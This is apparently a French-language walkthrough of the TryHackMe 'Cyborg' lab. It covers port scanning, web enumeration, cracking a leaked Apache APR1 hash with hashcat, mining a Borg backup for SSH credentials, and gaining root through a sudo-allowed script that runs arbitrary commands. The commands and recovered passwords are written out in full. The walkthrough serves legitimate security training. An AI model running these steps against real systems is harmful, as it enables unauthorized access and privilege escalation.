# Cyborg — Walkthrough

🔗 **Room TryHackMe :** [Cyborg](https://tryhackme.com/room/cyborgt8)

<p align="center">
  <img src="./screenshots/cyborg-logo.jpeg" alt="Logo Cyborg" width="240">
</p>

```diff
> le serveur web fuite un hash • Borg ouvre le coffre des backups • alex nous laisse une échelle sudo vers root
```

---

## ℹ️ Informations

- **Plateforme :** TryHackMe
- **Room :** Cyborg
- **Temps estimé :** environ 45 minutes
- **Objectif :** obtenir un accès SSH, récupérer `user.txt`, escalader en `root`, puis récupérer `root.txt`
- **Services exposés :** SSH et HTTP
- **Techniques principales :** énumération web, cassage de hash, analyse d'une archive Borg, abus d'un script sudo

---

## 🧠 Reconnaissance

### Scan des ports

On commence par identifier les services accessibles :

```bash
nmap -sC -sV -oN nmap.txt cyborg.thm
```

Résultats importants :

```text
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Deux portes seulement sont exposées :

- SSH sur le port `22`
- HTTP sur le port `80`

Comme nous n'avons pas encore d'identifiants, HTTP est le meilleur point de départ. SSH peut rester dans son coin à faire semblant d'être mystérieux.

---

## 🧭 Énumération Web

On lance une énumération de répertoires contre le serveur web :

```bash
dirsearch -u http://cyborg.thm/
```

Trouvailles utiles :

```text
/admin/              200
/admin/admin.html    200
/admin/index.html    200
/etc/                200
```

La page `/admin` donne plusieurs indices :

![Panneau admin](screenshots/1-AdminPanel.png)

- utilisateurs possibles : `alex`, `adam` et `josh`
- une référence à un backup `music_archive`
- un fichier téléchargeable `archive.tar`

Le chemin `/etc` expose une entrée de mot de passe :

![Fichier de mot de passe](screenshots/2-Password.png)

```text
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

Le format commence par `$apr1$`, ce qui indique un hash Apache MD5 APR1.

👉 **Insight :**
La cible ne fuite pas juste un hash au hasard. Elle fuite un hash nommé `music_archive`, et le panneau admin parle justement d'une archive. Quand les indices riment comme ça, on suit la musique.

---

## 🔐 Cassage du Hash

On identifie le hash :

```bash
hashid '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.'
```

Résultat :

```text
[+] MD5(APR)
[+] Apache MD5
```

On le casse avec le mode Hashcat `1600` :

```bash
hashcat -m 1600 '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' /usr/share/wordlists/rockyou.txt
```

Hashcat retrouve le mot de passe :

```text
music_archive:squidward
```

Nous avons donc :

```text
music_archive:squidward
```

Ce n'est pas encore un accès SSH. C'est le mot de passe du chemin d'archive que nous allons inspecter.

---

## 📦 Archive Borg

On télécharge puis on extrait l'archive depuis la page admin :

```bash
tar -xf archive.tar
```

À l'intérieur, on trouve un dépôt Borg. Le README inclus pointe vers BorgBackup :

![README Borg](screenshots/3-Readme.png)

On installe Borg si nécessaire :

```bash
sudo apt install borgbackup
```

On liste l'archive avec le mot de passe cassé comme passphrase :

```bash
borg list final_archive
```

Résultat :

```text
music_archive  Tue, 2020-12-29 09:00:38
```

On monte ensuite l'archive :

```bash
borg mount ./final_archive /home/cyber/THM/CTF/Cyborg
```

![Archive montée](screenshots/4-MountArchive.png)

Une fois montée, on inspecte les documents d'Alex :

```bash
cd /home/cyber/THM/CTF/Cyborg/music_archive/home/alex/Documents/
cat note.txt
```

La note fournit des identifiants SSH :

![Note avec identifiants](screenshots/5-Note.png)

```text
alex:S3cretP@s3
```

👉 **Insight :**
Les backups sont des machines à remonter le temps avec des problèmes de permissions. Si une note sensible a été sauvegardée une fois, elle peut rester récupérable longtemps après que tout le monde l'a oubliée.

---

## 🐚 Accès SSH

On utilise les identifiants récupérés dans l'archive Borg :

```bash
ssh alex@cyborg.thm
```

Mot de passe :

```text
S3cretP@s3
```

Après la connexion, on récupère le flag utilisateur :

```bash
cat user.txt
```

![Flag utilisateur](screenshots/6-UserFlag.png)

L'accès utilisateur est validé. Le premier shell n'est pas la fin. C'est le hall d'entrée, et le hall contient un ascenseur très suspect.

---

## ⬆️ Escalade de Privilèges

### Permissions sudo

On vérifie les privilèges sudo :

```bash
sudo -l
```

Résultat :

```text
User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Le script est notre chemin d'escalade. On l'inspecte :

```bash
cat /etc/mp3backups/backup.sh
```

Fin importante :

```bash
while getopts c: flag
do
        case "${flag}" in
                c) command=${OPTARG};;
        esac
done

cmd=$($command)
echo $cmd
```

Le script accepte une commande via `-c` et l'exécute. Comme `sudo` autorise ce script en tant que root, la commande s'exécute avec les privilèges root.

Un chemin direct consiste à lancer :

```bash
sudo /etc/mp3backups/backup.sh -c /bin/bash
```

Dans les notes originales, le script était aussi modifiable. Le remplacer par `/bin/bash`, puis l'exécuter avec sudo, donne un shell root :

```bash
echo "/bin/bash" > /etc/mp3backups/backup.sh
sudo /etc/mp3backups/backup.sh
whoami
```

Résultat :

```text
root
```

👉 **Insight :**
Un script qui prend une entrée contrôlée par l'utilisateur et l'exécute en root mérite un très long regard. Si sudo le bénit, ce regard devient un shell root.

---

## 👑 Flag Root

On se déplace dans le dossier de root et on lit le flag :

```bash
cd /root
cat root.txt
```

Flag root :

```text
flag{REDACTED}
```

![Réponses TryHackMe](screenshots/7-THMAnswers.png)

---

## 🧠 Conclusion

Cyborg est une bonne leçon d'énumération chaînée :

- les chemins web révèlent l'histoire de l'archive
- un hash APR1 donne la passphrase Borg
- Borg expose des identifiants utilisateur
- SSH donne le premier accès
- un script de backup autorisé par sudo donne root

Aucune étape n'est monstrueusement complexe, mais chaque étape dépend de l'indice précédent. La machine répète doucement : "regarde le backup", et à la fin le backup répond.

---

```diff
> hash cassé • backup monté • note récupérée • script sudo transformé en root
```

## 🔗 Références

- [TryHackMe - Cyborg](https://tryhackme.com/room/cyborgt8)
- [Documentation BorgBackup](https://borgbackup.readthedocs.io/)
- [Exemples de hash Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)

---

Les notes originales sont préservées dans [Cyborg-Notes.md](Cyborg-Notes.md).
